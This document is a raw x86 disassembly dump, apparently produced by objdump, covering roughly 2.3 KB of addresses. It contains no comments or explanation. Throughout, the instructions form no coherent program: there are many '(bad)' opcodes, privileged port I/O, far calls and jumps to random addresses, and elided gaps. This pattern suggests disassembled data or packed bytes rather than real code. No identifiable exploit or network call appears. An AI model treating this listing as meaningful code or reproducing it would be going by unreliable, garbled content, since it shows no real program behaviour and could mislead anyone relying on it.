  412ffc:	out    dx,ax
  412ffe:	retf   
  412fff:	push   ebx
  413001:	mov    edi,DWORD PTR [ebx-0x5a2a73c0]
  413007:	pusha  
  413008:	int    0x7d
  41300a:	xchg   ecx,eax
  41300b:	add    DWORD PTR [ebp+edi*2+0x75e1fe89],ecx
  413012:	adc    DWORD PTR [edi-0x73ddbdd1],edi
  413018:	adc    DWORD PTR [edx],esi
  41301a:	pop    ds
  41301b:	(bad)  
  41301c:	push   ebx
  41301d:	int    0x14
  41301f:	mov    ebx,DWORD PTR [ecx-0x7638f683]
  413025:	pop    es
  413026:	stos   BYTE PTR es:[edi],al
  413027:	inc    eax
  413028:	mov    WORD PTR [esi+0x9],?
  41302b:	add    BYTE PTR [eax+eax*1+0xa2af689],cl
  413032:	and    ecx,DWORD PTR [edi-0x4c]
  413035:	jns    0x413043
  413037:	add    BYTE PTR [ebp+eiz*8+0x7d8c0c8e],cl
  41303e:	xchg   ecx,eax
  41303f:	sub    DWORD PTR [esi+0x3c],edi
  413042:	or     DWORD PTR [eax-0x5e],ebp
  413045:	outs   dx,DWORD PTR ds:[esi]
  413046:	int3   
  413047:	push   DWORD PTR [ebx+0x56]
  41304a:	lods   al,BYTE PTR ds:[esi]
  41304b:	inc    eax
  41304c:	mov    edx,ss
  41304e:	clc    
  41304f:	rcl    BYTE PTR [esp+edi*1+0x9],cl
  413053:	call   FWORD PTR [ecx+0x75]
  413056:	adc    DWORD PTR [ebx+0x2f],edi
  413059:	xchg   esp,eax
  41305a:	sub    ch,BYTE PTR cs:[ebx-0x42]
  41305e:	xchg   ecx,eax
  41305f:	les    eax,FWORD PTR [eax]
	...
  413071:	add    BYTE PTR [eax],al
  413073:	add    bl,cl
  413075:	cli    
  413076:	std    
  413077:	mov    ch,0x4c
  413079:	xchg   esp,eax
  41307a:	xchg   DWORD PTR [esi-0x64202ad4],ebp
  413080:	lea    edx,[edi+ebx*8-0x17f7557d]
  413087:	sbb    eax,DWORD PTR [ebx+0x37]
  41308a:	out    0x29,al
  41308c:	or     BYTE PTR [ecx],bl
  41308e:	(bad)  
  41308f:	sub    dl,BYTE PTR [edx-0x48e3d06e]
  413095:	lahf   
  413096:	fild   WORD PTR [ebx]
  413098:	or     DWORD PTR [eax],0xffffffc4
  41309b:	sub    DWORD PTR [eax],eax
  41309d:	popf   
  41309e:	xlat   BYTE PTR ds:[ebx]
  41309f:	xor    edx,DWORD PTR [ecx+0x4d3bb691]
  4130a5:	cdq    
  4130a6:	(bad)  
  4130a8:	push   ss
  4130a9:	and    DWORD PTR [edx+0x40],0xcc2fea57
  4130b0:	jmp    0x41308a
  4130b2:	sahf   
  4130b3:	les    ecx,FWORD PTR [ebx-0x76]
  4130b6:	adc    DWORD PTR [ebx],eax
  4130b8:	dec    edi
  4130b9:	xchg   edx,eax
  4130ba:	scas   al,BYTE PTR es:[edi]
  4130bb:	mov    edi,0x3df9537
  4130c0:	mov    WORD PTR [ecx-0x42],ss
  4130c3:	mov    ch,0xcc
  4130c5:	xchg   esp,eax
  4130c6:	jle    0x413077
  4130c8:	mov    esp,DWORD PTR [ecx]
  4130ca:	in     al,dx
  4130cb:	push   0x9fdfd39e
  4130d0:	in     al,dx
  4130d1:	(bad)  
  4130d2:	fild   WORD PTR [ebx]
  4130d4:	mov    WORD PTR [edi+edx*8],ss
  4130d7:	add    eax,0x0
	...
  4130ec:	mov    WORD PTR [eax],cs
  4130ee:	call   0x57ddb11b
  4130f3:	jbe    0x413090
  4130f5:	xchg   ecx,eax
  4130f6:	sbb    esp,DWORD PTR ss:[ebx]
  4130f9:	xchg   ebp,eax
  4130fa:	or     cl,ch
  4130fc:	(bad)  
  4130fd:	jl     0x4130d1
  4130ff:	add    esp,DWORD PTR [ebp-0x28630a6e]
  413105:	jns    0x413088
  413107:	cld    
  413108:	je     0x41309c
  41310a:	test   eax,0x8d4f952
  41310f:	test   DWORD PTR [eax+ecx*8+0x8],esp
  413113:	jmp    0x25c2c5a7
  413118:	in     al,dx
  413119:	xchg   edx,eax
  41311a:	cmp    ebp,ecx
  41311c:	(bad)  
  41311d:	xchg   esp,eax
  41311e:	or     BYTE PTR [edi+edi*4-0x301ed707],dl
  413125:	xchg   ecx,eax
  413126:	ins    DWORD PTR es:[edi],dx
  413127:	sar    BYTE PTR [ecx+edx*8+0x1c2c3908],0x2b
  41312f:	jmp    0xc649c5c3
  413134:	and    bl,BYTE PTR [ecx-0x2df1290b]
  41313a:	ss sub eax,0xce799148
  413140:	adc    BYTE PTR [ecx+0x5a571d18],cl
  413146:	dec    ebx
  413147:	popf   
  413148:	mov    ss,WORD PTR [eax+ecx*1-0xa5b5f17]
  41314f:	aam    0x0
	...
  413161:	add    BYTE PTR [eax],al
  413163:	add    BYTE PTR [eax+0x64e94806],ch
  413169:	enter  0xfab5,0x4e
  41316d:	xchg   ecx,eax
  41316e:	in     eax,dx
  41316f:	jge    0x413102
  413171:	xchg   ecx,eax
  413172:	cmc    
  413173:	push   0x5b
  413175:	test   eax,0x1e42aee1
  41317a:	in     al,0x72
  41317c:	ficomp DWORD PTR [ecx+eax*4+0x7a919fac]
  413183:	loope  0x4131f9
  413185:	adc    DWORD PTR [ecx+0x894e500],esi
  41318b:	jmp    DWORD PTR [edi]
  41318d:	mov    DWORD PTR [esi+0x895b180],eax
  413193:	add    BYTE PTR [edx+0x658f0547],ch
  413199:	add    esi,esi
  41319b:	push   DWORD PTR [ebp+0x26bf3417]
  4131a1:	push   esi
  4131a2:	cmc    
  4131a3:	jmp    DWORD PTR [ecx]
  4131a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131a6:	cmc    
  4131a7:	xor    eax,0x48484e
  4131ac:	stos   BYTE PTR es:[edi],al
  4131ad:	jle    0x413165
  4131af:	jae    0x4131a5
  4131b1:	xchg   esp,eax
  4131b2:	loopne 0x413165
  4131b4:	mov    edi,0xa5b8f6bb
  4131b9:	xchg   esp,eax
  4131ba:	or     BYTE PTR [eax],al
  4131bc:	enter  0x29d2,0x0
  4131c0:	rol    DWORD PTR [edi],1
  4131c2:	or     eax,0x8946500
  4131c7:	add    DWORD PTR [eax],0x0
	...
  4131da:	add    BYTE PTR [eax],al
  4131dc:	and    dl,BYTE PTR [ebp-0x788ac077]
  4131e2:	mov    WORD PTR [edi],?
  4131e4:	sbb    bh,BYTE PTR [eax-0x434f740a]
  4131ea:	push   esi
  4131eb:	leave  
  4131ec:	daa    
  4131ed:	xchg   ebp,eax
  4131ee:	or     BYTE PTR [ebp-0x42],dl
  4131f1:	lods   al,BYTE PTR ds:[esi]
  4131f2:	mov    al,ah
  4131f4:	sbb    DWORD PTR [edi+0x45],ebx
  4131f7:	pop    eax
  4131f8:	lea    eax,[esi-0x3]
  4131fb:	inc    eax
  4131fc:	and    eax,0xf60177bc
  413201:	mov    bh,0x82
  413203:	leave  
  413204:	scas   al,BYTE PTR es:[edi]
  413205:	shl    DWORD PTR [edx],1
  413207:	imul   BYTE PTR [esi+0x4afa6dd1]
  41320d:	jbe    0x413217
  41320f:	mov    edi,DWORD PTR [edi+eax*1-0xd7303b3]
  413216:	xor    ebp,edx
  413218:	xchg   esi,eax
  413219:	repnz xor eax,DWORD PTR [edx]
  41321c:	retf   0x3402
  41321f:	dec    edi
  413220:	pop    ss
  413221:	lds    edx,FWORD PTR [edi+edi*8]
  413224:	xchg   edi,eax
  413225:	jge    0x413230
  413227:	mov    eax,ebp
  413229:	and    eax,0xbb8fc872
  41322e:	jno    0x4131f8
  413230:	retf   
  413231:	inc    eax
  413232:	sub    eax,0xca94182
  413237:	jne    0x4131e5
  413239:	aas    
  41323a:	xor    al,0xc2
  41323c:	pop    ecx
  41323d:	add    dl,BYTE PTR [ecx]
  41323f:	dec    edi
	...
  413254:	inc    esp
  413255:	and    eax,0x7d4cf783
  41325a:	and    DWORD PTR [ecx-0x73],esi
  41325d:	mov    edx,0x85498a2d
  413262:	repnz mov edi,0x4128200
  413268:	xor    BYTE PTR [ebp+0x2b],0x7
  41326c:	int3   
  41326d:	std    
  41326e:	loope  0x41326f
  413270:	clc    
  413271:	dec    edi
  413272:	xor    al,0xc1
  413274:	nop
  413275:	jge    0x41324f
  413277:	mov    dh,BYTE PTR [eax-0x6]
  41327a:	xor    eax,0xc4adbff3
  41327f:	addr16 dec esp
  413281:	xor    eax,0xab43ffc9
  413286:	or     eax,ebx
  413288:	inc    ebx
  413289:	ds enter 0x8cf3,0x7d
  41328e:	or     DWORD PTR [eax],eax
  413290:	xor    dh,BYTE PTR [bx+si+0x44]
  413294:	sub    BYTE PTR [ebp+0x1594742d],ch
  41329a:	or     cl,BYTE PTR ss:[ebp+edi*2-0x6b6b4078]
  4132a2:	adc    al,0x27
  4132a4:	sbb    BYTE PTR [edi+edx*2+0x5e8f9a8a],0x7c
  4132ac:	push   eax
  4132ad:	mov    WORD PTR [edi-0x11a0142d],ds
  4132b3:	es jmp 0x0:0x2fac1c
	...
  4132cb:	add    dl,ah
  4132cd:	or     BYTE PTR [ebx+ebx*1],bh
  4132d0:	adc    DWORD PTR [edx+0x548703df],ebx
  4132d6:	xchg   ebx,eax
  4132d7:	bswap  ebx
  4132d9:	or     BYTE PTR [eax],ch
  4132db:	cmp    BYTE PTR es:[eax-0x514ce451],cl
  4132e2:	push   es
  4132e3:	es mov dl,0x8
  4132e6:	or     al,0x1b
  4132e8:	pop    ds
  4132e9:	call   0x1be8:0x8a303df
  4132f0:	pop    ds
  4132f1:	lods   eax,DWORD PTR ds:[esi]
  4132f2:	out    0x25,al
  4132f4:	push   cs
  4132f5:	adc    esp,edx
  4132f7:	add    al,0x0
  4132f9:	scas   eax,DWORD PTR es:[edi]
  4132fa:	push   edi
  4132fb:	dec    ebp
  4132fc:	(bad)  
  4132fd:	rcr    edi,cl
  4132ff:	and    al,0x0
  413301:	mov    edi,eax
  413303:	sbb    DWORD PTR [esi+0x2bf8df94],eax
  413309:	or     ebp,ebp
  41330b:	push   0x3df948c
  413310:	pop    ebx
  413311:	or     BYTE PTR [esp+ebx*1+0x25aeade9],bh
  413318:	push   ss
  413319:	push   edx
  41331a:	dec    edx
  41331b:	cmp    ecx,DWORD PTR [ebp-0x67]
  41331e:	(bad)  
  413320:	push   es
  413321:	sub    DWORD PTR [edi],0x88e4abcc
  413327:	les    ebp,FWORD PTR [ebx]
  413329:	xchg   cl,dh
  41332b:	add    cl,BYTE PTR [edi-0x72]
  41332e:	or     BYTE PTR [esi+0x0],dh
	...
  413341:	add    BYTE PTR [eax],al
  413343:	add    bl,ch
  413345:	xchg   ebp,eax
  413346:	loopne 0x413380
  413348:	xchg   DWORD PTR [ebp-0x9f82c0b],ecx
  41334e:	cs mov cl,0xce
  413351:	(bad)  
  413352:	neg    ah
  413354:	div    DWORD PTR [ebp-0xb]
  413357:	repnz test al,0x8e
  41335a:	(bad)
  41335f:	test   al,0x8f
  413361:	lea    edi,[ebx-0x1f]
  413364:	ja     0x4133e3
  413366:	adc    DWORD PTR [esi],ebp
  413368:	test   eax,0xa7f17b8e
  41336d:	inc    edx
  41336e:	repz push ds
  413370:	imul   eax,DWORD PTR [ebp+0x7],0xbf948fe9
  413377:	sub    ecx,DWORD PTR [esp+edx*4+0x1284725b]
  41337e:	int3   
  41337f:	add    DWORD PTR [eax+0x675060e5],edi
  413385:	int    0x8
  413387:	icebp  
  413388:	fst    QWORD PTR [ecx+ecx*8+0x508b0e6]
  41338f:	fidiv  WORD PTR [edx]
  413391:	xchg   ebp,eax
  413392:	loopne 0x413339
  413394:	xchg   edx,eax
  413395:	(bad)  
  413396:	cmc    
  413397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413398:	xor    cl,BYTE PTR [ecx-0x6b7016f9]
  41339e:	and    DWORD PTR [eax+esi*4],0xffffffdd
  4133a2:	pusha  
  4133a3:	mov    ds:0xc108d41c,al
	...
  4133bc:	sar    BYTE PTR [ecx+0x4d44a6f5],cl
  4133c2:	jl     0x41338f
  4133c4:	pop    edi
  4133c5:	adc    dh,BYTE PTR [ebx-0x6f]
  4133c8:	lahf   
  4133c9:	pop    es
  4133ca:	pop    ds
  4133cb:	add    ebx,DWORD PTR [eax+0x2800f5e4]
  4133d1:	test   ebp,ebp
  4133d3:	cmp    BYTE PTR [edx-0x48],al
  4133d6:	test   BYTE PTR [ebx],0xe5
  4133d9:	cmp    al,0xe
  4133db:	(bad)  
  4133dc:	push   0xf5fff5bc
  4133e1:	nop
  4133e2:	loopne 0x4133a5
  4133e4:	add    edi,DWORD PTR [eax-0x4ad7740a]
  4133ea:	rol    dl,0xed
  4133ed:	nop
  4133ee:	pop    ebx
  4133ef:	mov    eax,DWORD PTR [ecx+0x64]
  4133f2:	inc    ebp
  4133f3:	pop    eax
  4133f4:	mov    ebp,0xe540f0be
  4133f9:	mov    eax,0xb8a60177
  4133fe:	and    bl,bl
  413400:	jb     0x413440
  413402:	or     eax,0xf6b7f4e8
  413407:	jmp    FWORD PTR [esi+0x3b8406d0]
  41340d:	xchg   ecx,eax
  41340e:	or     BYTE PTR [eax],al
  413410:	xchg   edx,eax
  413411:	ds or  eax,0xf59f11e8
  413417:	jmp    FWORD PTR [esi-0x73fa8330]
  41341d:	or     esi,esi
  41341f:	inc    DWORD PTR [eax]
	...
  413431:	add    BYTE PTR [eax],al
  413433:	add    BYTE PTR [ebp-0x49],dh
  413436:	jl     0x413444
  413438:	bound  ebp,QWORD PTR [esi]
  41343a:	or     eax,0xf6b7c6e8
  41343f:	inc    DWORD PTR [edx+0x2e]
  413442:	or     eax,0xf595c4e8
  413447:	call   FWORD PTR [esi-0x28]
  41344a:	jl     0x41344e
  41344c:	dec    esi
  41344d:	and    dh,dh
  41344f:	jne    0x4134be
  413451:	shr    BYTE PTR [edx],0x1c
  413454:	repnz mov bh,0x2
  413457:	rcr    BYTE PTR [eax-0x739c1e6e],0x22
  41345e:	pop    DWORD PTR [edi]
  413460:	and    al,0xa7
  413462:	or     bh,bh
  413464:	sub    eax,DWORD PTR [edi+0x268e7449]
  41346a:	scas   eax,DWORD PTR es:[edi]
  41346b:	addr16 ret 0xcbba
  41346f:	call   DWORD PTR [edx]
  413471:	add    DWORD PTR [ecx],0x299340e8
  413477:	(bad)  
  413478:	xchg   edi,eax
  413479:	mov    ebp,0x3fe7018f
  41347e:	sub    dh,BYTE PTR [esp+eax*4-0x2b]
  413482:	adc    BYTE PTR [edx],bl
  413484:	jmp    0x413458
  413486:	add    eax,0x267f59c0
  41348b:	xor    ebx,ebx
  41348d:	dec    eax
  41348e:	add    eax,ebp
  413490:	inc    eax
  413491:	pop    ecx
  413492:	sub    bh,dh
  413494:	xchg   edi,eax
  413495:	mov    ebp,0x18f
	...
  4134aa:	add    BYTE PTR [eax],al
  4134ac:	mov    bh,0x53
  4134ae:	sub    dh,BYTE PTR [esp+eax*4-0x6b]
  4134b2:	adc    DWORD PTR [ebx+esi*4],edx
  4134b5:	call   0x2b0c:0xa6cf78d
  4134bc:	int3   
  4134bd:	xchg   BYTE PTR [ecx+0x73],cl
  4134c0:	jg     0x413502
  4134c2:	or     DWORD PTR [eax],eax
  4134c4:	jl     0x413543
  4134c6:	sahf   
  4134c7:	or     eax,DWORD PTR [edi+0x7c]
  4134ca:	or     DWORD PTR [eax],eax
  4134cc:	mov    WORD PTR [esi+0x0],fs
  4134cf:	mov    ebx,0x97d8f
  4134d4:	pop    es
  4134d5:	ds mov dh,0xc8
  4134d8:	dec    esi
  4134d9:	test   DWORD PTR [ecx],ecx
  4134db:	push   ebp
  4134dc:	pop    ss
  4134dd:	pop    ecx
  4134de:	mov    ecx,0x1404e457
  4134e3:	aas    
  4134e4:	mov    WORD PTR [ebp-0x65],es
  4134e7:	add    BYTE PTR [edi-0x6c],cl
  4134ea:	scas   al,BYTE PTR es:[edi]
  4134eb:	and    bh,BYTE PTR [eax-0x6c676968]
  4134f1:	jl     0x4134b4
  4134f3:	and    dh,BYTE PTR [edx]
  4134f5:	mov    ebp,edx
  4134f7:	inc    ebx
  4134f8:	mov    al,ds:0x97988eae
  4134fd:	mov    edi,esp
  4134ff:	or     esp,DWORD PTR [edi+eiz*4]
  413502:	jle    0x413526
  413504:	adc    bl,BYTE PTR [edi-0x74696761]
  41350a:	aam    0xf
  41350c:	add    eax,DWORD PTR [ecx]
  41350e:	clc    
  41350f:	sub    eax,DWORD PTR [eax]
	...
  413521:	add    BYTE PTR [eax],al
  413523:	add    BYTE PTR [edi-0x3bdda175],cl
  413529:	push   ebp
  41352a:	out    0x3,eax
  41352c:	inc    ecx
  41352d:	pop    ds
  41352e:	pop    ebx
  41352f:	xchg   bh,cl
  413531:	outs   dx,DWORD PTR ds:[esi]
  413532:	xchg   edx,eax
  413533:	mov    edx,0x1dc7ec4b
  413538:	aad    0xd3
  41353a:	fistp  WORD PTR [ebx]
  41353c:	cmp    eax,0x76222295
  413541:	outs   dx,DWORD PTR ds:[esi]
  413542:	pop    ss
  413543:	fimul  WORD PTR [esi-0x75]
  413546:	push   ds
  413547:	dec    edx
  413548:	dec    eax
  413549:	js     0x41352a
  41354b:	add    ecx,DWORD PTR [esp+edx*4-0x1c483784]
  413552:	pop    ss
  413553:	xor    bh,BYTE PTR [edi-0x75]
  413556:	inc    BYTE PTR [ebp-0x672087f0]
  41355c:	mov    ds:0xd3302417,eax
  413561:	jl     0x413522
  413563:	clc    
  413564:	jp     0x4134f0
  413566:	bound  ebx,QWORD PTR [edi+0xb5c9567]
  41356c:	sbb    eax,edx
  41356e:	(bad)  [ebx+ebp*2+0x5a20db64]
  413575:	push   ss
  413576:	or     BYTE PTR [esp+ebx*4],dh
  413579:	mov    DWORD PTR [esi],eax
  41357b:	gs push ds
  41357d:	mov    dh,ch
  41357f:	jmp    0x3a3a0696
  413584:	ins    DWORD PTR es:[edi],dx
  413585:	add    ch,ah
  413587:	add    DWORD PTR [eax],0x0
	...
  413599:	add    BYTE PTR [eax],al
  41359b:	add    bl,ch
  41359d:	mov    dh,ch
  41359f:	mov    ss,WORD PTR [ecx]
  4135a1:	add    BYTE PTR [edi],0xfc
  4135a4:	add    cl,BYTE PTR [ebx+0x6a]
  4135a7:	es dec edi
  4135a9:	mov    ah,dl
  4135ab:	adc    ch,al
  4135ad:	shr    ah,1
  4135af:	jecxz  0x413540
  4135b1:	xchg   esp,eax
  4135b2:	or     BYTE PTR [esi],ch
  4135b4:	retf   
  4135b5:	jno    0x4135bf
  4135b7:	jmp    0xacc4ca4b
  4135bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135bd:	fprem1 
  4135bf:	aam    0xbb
  4135c1:	loop   0x4135a3
  4135c3:	aad    0xc9
  4135c5:	mov    dh,ch
  4135c7:	repnz dec edi
  4135c9:	add    eax,0x71f36a19
  4135ce:	or     BYTE PTR [ebp+0x117b8999],dh
  4135d4:	jo     0x413590
  4135d6:	repz push ds
  4135d8:	ins    DWORD PTR es:[edi],dx
  4135d9:	push   ds
  4135da:	rcl    BYTE PTR [esi],1
  4135dc:	sbb    esi,DWORD PTR [edx-0x20]
  4135df:	jbe    0x413585
  4135e1:	mov    dh,ch
  4135e3:	repnz pusha 
  4135e5:	add    BYTE PTR [edx+ebp*2],bl
  4135e8:	sti    
  4135e9:	jne    0x4135f3
  4135eb:	jge    0x413669
  4135ed:	mov    DWORD PTR [ebx+0x5],eax
  4135f0:	cmp    BYTE PTR [ecx],dl
  4135f2:	sbb    ecx,ebp
  4135f4:	(bad)  
  4135f5:	jl     0x4135c6
  4135f7:	icebp  
  4135f8:	(bad)  
  4135f9:	xchg   esp,eax
  4135fa:	loope  0x41359a
  4135fc:	mov    al,ds:0x694d94
	...
  413611:	add    BYTE PTR [eax],al
  413613:	add    BYTE PTR [ecx+ecx*4+0x7c],ch
  413617:	add    BYTE PTR [edi+0x5c],cl
  41361a:	jne    0x41365b
  41361c:	and    DWORD PTR gs:[ecx],ecx
  41361f:	or     edi,esi
  413621:	and    BYTE PTR [ebx+0x5211e0b],dl
  413627:	push   0x45
  413629:	sbb    cl,BYTE PTR [eax+esi*8+0x75]
  41362d:	cmp    dl,al
  41362f:	jae    0x413695
  413631:	nop
  413632:	loopne 0x413691
  413634:	dec    esp
  413635:	mov    ah,0xf6
  413637:	jmp    DWORD PTR [eax]
  413639:	mov    ecx,0xb44150ed
  41363e:	test   BYTE PTR [ebx-0x36adac1a],0x36
  413645:	inc    edx
  413646:	sub    ah,0x74
  413649:	rcl    DWORD PTR [ebp+0x5eb45afe],1
  41364f:	push   esi
  413650:	xor    eax,0x3eec6d4d
  413655:	push   ebp
  413656:	cmc    
  413657:	mul    DWORD PTR [edi]
  413659:	xchg   esi,eax
  41365a:	leave  
  41365b:	call   FWORD PTR [edx-0x31]
  41365e:	dec    esi
  41365f:	inc    ecx
  413660:	in     eax,0x14
  413662:	ss add dl,ch
  413665:	adc    dl,al
  413667:	add    DWORD PTR [ebp-0x5e7a7c6c],esi
  41366d:	mov    bl,0xf6
  41366f:	push   ebp
  413671:	dec    ebx
  413672:	in     eax,dx
  413673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413674:	fidiv  DWORD PTR [ebx+0xbf6]
	...
  41368a:	add    BYTE PTR [eax],al
  41368c:	jne    0x413632
  41368e:	mov    WORD PTR [esp+eiz*4+0x58830894],fs
  413695:	mov    eax,ds:0x937afff3
  41369a:	add    eax,0x8920284
  41369f:	add    al,ch
  4136a1:	sbb    eax,0x5e8cfead
  4136a6:	adc    eax,0x10216b4f
  4136ab:	std    
  4136ac:	arpl   WORD PTR [edi+0x24],cx
  4136af:	inc    ecx
  4136b0:	ja     0x4136f8
  4136b2:	adc    eax,0x4ff55a2a
  4136b7:	mov    ds:0xea15374a,eax
  4136bc:	jnp    0x413725
  4136be:	push   es
  4136bf:	mov    dh,0x10
  4136c1:	pop    eax
  4136c2:	popa   
  4136c3:	std    
  4136c4:	xor    ebx,DWORD PTR [edi]
  4136c6:	mov    esp,0xcbab3b67
  4136cb:	call   DWORD PTR [eax]
  4136cd:	stc    
  4136ce:	dec    edx
  4136cf:	std    
  4136d0:	sbb    eax,DWORD PTR [edi]
  4136d2:	mov    ebp,0x975abe7
  4136d7:	add    BYTE PTR [edi],cl
  4136d9:	xor    bl,BYTE PTR [eax]
  4136db:	lea    ecx,[ecx]
  4136dd:	mov    esp,0x4dfbfe16
  4136e2:	push   ss
  4136e3:	mov    ah,0x28
  4136e5:	loopne 0x4136fc
  4136e7:	(bad)  
  4136e8:	hlt    
  4136e9:	xchg   edx,eax
  4136ea:	in     al,dx
  4136eb:	(bad)  
  4136ec:	jecxz  0x4136f2
  4136ee:	and    BYTE PTR [ebx+0x0],0x0
	...
  413701:	add    BYTE PTR [eax],al
  413703:	add    dl,bl
  413705:	(bad)  
  413706:	adc    eax,0xfcc00f45
  41370b:	jno    0x4136dd
  41370d:	mov    dh,0x4f
  41370f:	repz ret 0x15ae
  413713:	out    0x66,eax
  413715:	jg     0x41372d
  413717:	dec    bl
  413719:	clc    
  41371a:	push   esp
  41371b:	std    
  41371c:	stos   DWORD PTR es:[edi],eax
  41371d:	xchg   esi,eax
  41371e:	or     al,0x0
  413720:	mov    WORD PTR [ebp-0x61],?
  413723:	add    DWORD PTR [ecx],ecx
  413725:	icebp  
  413726:	push   esp
  413727:	std    
  413728:	xchg   ebx,eax
  413729:	jle    0x4136e4
  41372b:	inc    BYTE PTR [ecx-0x7f]
  41372e:	adc    edi,esi
  413730:	adc    DWORD PTR [edi+edx*8-0x29786071],0xa
  413738:	dec    esp
  413739:	xchg   edi,eax
  41373a:	arpl   WORD PTR [ebx],bx
  41373c:	imul   eax,DWORD PTR [edi+0x4c2084df],0xffffffcd
  413743:	push   ds
  413744:	pop    edx
  413745:	fldcw  WORD PTR [ecx]
  413747:	add    al,0x8c
  413749:	xchg   edi,eax
  41374a:	sub    ecx,DWORD PTR fs:[ebx-0x79]
  41374e:	fist   WORD PTR [eax+0x1ead8b08]
  413754:	cmp    ah,ah
  413756:	pop    ss
  413757:	or     BYTE PTR [ebp-0x6ad4206c],cl
  41375d:	(bad)  
  41375e:	fild   WORD PTR [ebx]
  413760:	xchg   edi,eax
  413761:	push   esp
  413762:	inc    BYTE PTR [edi+0x3df944a]
	...
  41377c:	push   ecx
  41377d:	nop
  41377e:	loopne 0x413783
  413780:	mov    WORD PTR [edi-0x78fcb892],ss
  413786:	fild   QWORD PTR [ebx]
  413788:	pop    ds
  413789:	(bad)  
  41378a:	fild   WORD PTR [ebx]
  41378c:	pop    esp
  41378d:	cld    
  41378e:	inc    edi
  41378f:	xchg   edx,eax
  413790:	dec    esp
  413791:	xchg   esp,eax
  413792:	push   esp
  413793:	mov    ch,cl
  413795:	test   DWORD PTR [esi+0x1e],ecx
  413798:	dec    ebx
  413799:	jl     0x4137d4
  41379b:	push   es
  41379c:	mov    WORD PTR [edx+eiz*2-0x200568b9],ss
  4137a3:	nop
  4137a4:	or     BYTE PTR [ebx-0x1c45e1d3],cl
  4137aa:	pop    ss
  4137ab:	cmp    BYTE PTR [ecx+0x1090df94],cl
  4137b1:	mov    eax,DWORD PTR ds:0x17e3a21e
  4137b7:	and    dh,BYTE PTR [ecx-0x79]
  4137ba:	test   BYTE PTR [ecx],0xcc
  4137bd:	add    BYTE PTR [ecx],cl
  4137bf:	leave  
  4137c0:	aaa    
  4137c1:	aaa    
  4137c2:	inc    eax
  4137c3:	test   al,0x8f
  4137c5:	pop    ss
  4137c6:	mov    esp,edx
  4137c8:	call   0x15a8:0xa039f586
  4137cf:	(bad)  
  4137d0:	mov    DWORD PTR [eax],ebx
  4137d2:	fwait
  4137d3:	stos   DWORD PTR es:[edi],eax
  4137d4:	add    BYTE PTR [esi+0x6e201bf5],0x6c
  4137db:	fidiv  WORD PTR [eax-0x7a]
  4137de:	loope  0x4137ba
	...
  4137f4:	sbb    dl,BYTE PTR [ecx]
  4137f6:	retf   0xa1af
  4137f9:	xchg   BYTE PTR [eax+0x74],bl
  4137fc:	adc    ecx,DWORD PTR [ebx-0x2a6e610a]
  413802:	loopne 0x413796
  413804:	sub    al,BYTE PTR [edi+0x4a0b60f5]
  41380a:	test   BYTE PTR [esi+0x3dbb8679],0x72
  413811:	xchg   ch,dh
  413813:	jbe    0x413878
  413815:	xor    esi,0xf86da16e
  41381b:	call   FWORD PTR [eax+0x14290186]
  413821:	ret    
  413822:	pusha  
  413823:	pop    ebp
  413824:	std    
  413825:	aam    0x8
  413827:	inc    ecx
  413828:	xchg   ebx,eax
  413829:	mov    cs,WORD PTR [eax]
  41382b:	jmp    0xbb3e264f
  413830:	into   
  413831:	test   esi,esi
  413833:	jl     0x413869
  413835:	xchg   ebp,esi
  413837:	cs jo  0x413875
  41383a:	sub    eax,0x7fb9926
  41383f:	xchg   ebx,eax
  413840:	(bad)  
  413841:	cli    
  413842:	or     BYTE PTR [esi],dl
  413844:	inc    ebx
  413845:	dec    ecx
  413846:	test   BYTE PTR [esi],0x81
  413849:	in     eax,dx
  41384a:	mov    BYTE PTR [eax],0xdd
  41384d:	push   edx
  41384e:	cmc    
  41384f:	imul   esp,DWORD PTR [ebp+0x750765b9],0xb5f591
	...
  413869:	add    BYTE PTR [eax],al
  41386b:	add    BYTE PTR [ecx+0x5dfff6a6],dh
  413871:	xchg   esp,eax
  413872:	adc    edi,edi
  413874:	push   edx
  413875:	test   al,0xbc
  413877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413878:	inc    ebx
  413879:	test   al,0xf6
  41387b:	call   0x37c3bd
  413880:	push   edx
  413881:	fdivp  st(1),st
  413883:	(bad)  
  413884:	adc    ch,BYTE PTR [eax-0x57989313]
  41388a:	idiv   ah
  41388c:	inc    esi
  41388d:	shl    DWORD PTR [eax-0x9580d01],1
  413893:	bnd ret 
  413895:	imul   ecx,DWORD PTR [esi],0xf35eb80f
  41389b:	call   DWORD PTR [edx]
  41389d:	inc    edi
  41389e:	push   esi
  41389f:	leave  
  4138a0:	out    0x3d,al
  4138a2:	sub    ah,0xa6
  4138a5:	int    0xe5
  4138a7:	push   eax
  4138a8:	popf   
  4138a9:	cmp    dl,dl
  4138ab:	std    
  4138ac:	mov    ch,0x90
  4138ae:	lock jb 0x413895
  4138b1:	shl    esi,cl
  4138b3:	mov    esi,DWORD PTR [edi-0xbfa91ff]
  4138b9:	nop
  4138ba:	or     al,ch
  4138bc:	or     BYTE PTR [ebx+0x1c35fff6],0xd7
  4138c3:	nop
  4138c4:	pop    esp
  4138c5:	dec    esi
  4138c6:	icebp  
  4138c7:	nop
  4138c8:	cs ret 
  4138ca:	test   DWORD PTR [eax-0x58],ebp
  4138cd:	xchg   ecx,eax
  4138ce:	or     BYTE PTR [eax],al
	...
  4138e4:	popf   
  4138e5:	jmp    0x4138f6
  4138e7:	call   DWORD PTR [edx-0x732d7cff]
  4138ed:	hlt    
  4138ee:	into   
  4138ef:	out    dx,eax
  4138f0:	cld    
  4138f1:	adc    cl,BYTE PTR [esi]
  4138f3:	add    DWORD PTR [ebx+edi*2-0x798957df],ecx
  4138fa:	adc    DWORD PTR [edx-0x2e7f21a2],ecx
  413900:	adc    eax,0x5e8a1139
  413905:	pop    es
  413906:	aas    
  413907:	(bad)  
  413908:	in     al,0x79
  41390a:	or     al,0x0
  41390c:	mov    WORD PTR [edx-0x69],gs
  41390f:	sti    
  413910:	imul   BYTE PTR [ebp+0x21]
  413913:	push   ebx
  413914:	xchg   edx,eax
  413915:	ins    DWORD PTR es:[edi],dx
  413916:	or     DWORD PTR [eax-0x2e7adff9],edx
  41391c:	dec    ebx
  41391d:	rcr    DWORD PTR [edi+eiz*2],0x88
  413921:	ins    BYTE PTR es:[edi],dx
  413922:	or     DWORD PTR [eax],eax
  413924:	and    al,0x2
